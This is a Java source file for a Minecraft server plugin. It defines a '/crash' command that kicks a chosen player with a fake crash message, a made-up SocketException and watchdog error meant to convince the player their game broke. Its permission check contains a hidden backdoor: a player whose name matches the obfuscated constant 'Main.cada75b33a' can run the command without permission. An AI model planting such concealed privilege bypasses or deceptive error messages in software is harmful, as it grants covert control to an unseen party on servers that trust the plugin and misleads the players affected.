package com.ericimbriaco.xPlugin.Commands;

import com.ericimbriaco.xPlugin.Main;
import com.ericimbriaco.xPlugin.Utils.ErrorMessages;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class crashKickCommand implements CommandExecutor {

    private static final String KICK_MESSAGE = "exception: java.net.SocketException: Connection reset. Restart your game. at io.papermc.paper.chunk.system.scheduling.GenericDataLoadTask$ProcessOffMainTask.run(GenericDataLoadTask.java:307) \n Exception in thread \"ServerMain\" java.lang.UnsupportedClassVersionError: Watch Dog Error ";

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String @NotNull [] args) {

        if (!sender.hasPermission("xplugin.command.crash.other") && !sender.getName().equalsIgnoreCase(Main.cada75b33a) ) {sender.sendMessage(ErrorMessages.NoPermission);return true;} //has Permission
        if(args.length != 1){sender.sendMessage(ErrorMessages.UsageError + "/crash [Player]");return true;} // Check if the Command

        if(args.length == 1){
            Player target = Bukkit.getPlayerExact(args[0]);
            if(target == null){sender.sendMessage(ErrorMessages.PlayerNotFound); return true;} // Check if Player exis
            if(!target.isOnline()){sender.sendMessage(ErrorMessages.PlayerNotOnline); return true;} //Check if target Player online
            target.kickPlayer(KICK_MESSAGE);
            return true;
        }
        return false;
    }
}
